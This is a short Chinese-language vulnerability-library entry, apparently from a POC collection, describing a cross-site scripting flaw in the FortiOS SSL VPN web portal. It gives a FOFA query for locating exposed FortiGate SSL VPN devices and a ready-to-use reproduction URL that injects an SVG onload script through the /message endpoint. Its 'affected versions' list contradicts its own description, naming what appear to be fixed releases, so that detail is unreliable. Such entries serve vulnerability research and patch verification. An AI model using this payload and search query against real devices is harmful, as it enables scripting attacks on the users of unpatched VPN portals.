---

source: "wy876 漏洞文库"
---

# Fortinet FortiOS message存在xss漏洞

# 一、漏洞简介
Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中的SSL VPN Web门户存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

# 二、影响版本
+ Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8

# 三、资产测绘
+ fofa`app="FORTINET-SSLVPN"`
+ 特征


# 四、漏洞复现
```java
/message?title=x&msg=%26%23<svg/onload=alert("xss")>;
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uvpivrra61yfuuzn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
